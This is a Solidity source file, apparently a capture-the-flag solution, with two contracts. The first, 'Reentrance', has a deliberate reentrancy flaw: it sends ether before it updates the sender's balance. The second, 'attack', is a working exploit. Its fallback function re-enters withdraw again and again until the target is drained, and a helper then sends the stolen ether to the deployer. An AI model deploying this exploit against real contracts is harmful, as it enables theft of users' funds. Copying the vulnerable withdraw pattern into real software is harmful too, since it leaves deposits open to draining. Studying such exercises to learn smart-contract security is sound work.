// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
contract attack{
    Reentrance re;
    address  payable owner;
    uint public balance;
    uint money;
    constructor(address payable _addr)public  {
        re = Reentrance(_addr);
        owner = msg.sender;
    }
    function donate()public payable{
        money = msg.value;
        re.donate{value:money}(address(this));
    }
    function withdraw()public{
        re.withdraw(money);
    }
    function qu()public{
        owner.transfer(address(this).balance);
    }
    fallback()external payable{
        balance = address(re).balance;
        if (balance>0){

        if(balance>=money){
            re.withdraw(money);
        }else{
            re.withdraw(balance);
        }
        }
    }
}

